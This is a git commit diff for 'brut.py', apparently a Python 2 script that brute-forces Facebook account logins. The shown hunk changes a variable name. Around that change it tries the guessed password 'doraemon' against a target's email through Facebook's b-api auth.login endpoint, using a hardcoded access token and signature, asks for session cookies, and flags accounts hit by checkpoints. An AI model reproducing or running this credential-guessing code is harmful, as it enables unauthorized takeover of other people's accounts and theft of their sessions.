c5c4fc0b88e44c7238ac009cbe199dc4c6cb0a7e
Iqbal_Dev <47203081+IqbalDev@users.noreply.github.com>
2019-07-10 23:54:09 +0700

    Update brut.py

--- brut.py
+++ brut.py
@@ -135,7 +135,7 @@ def brutefor():
                                                                                 elif "www.facebook.com" in js["error_msg"]:
                                                                                         print "  Cekpoint : " + san9
                                                                                 else:
-                                                                                        san8 = "doraemon"
+                                                                                        san10 = "doraemon"
                                                                                         print " [+] " + san10
                                                                                         dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                         js = json.load(dev)
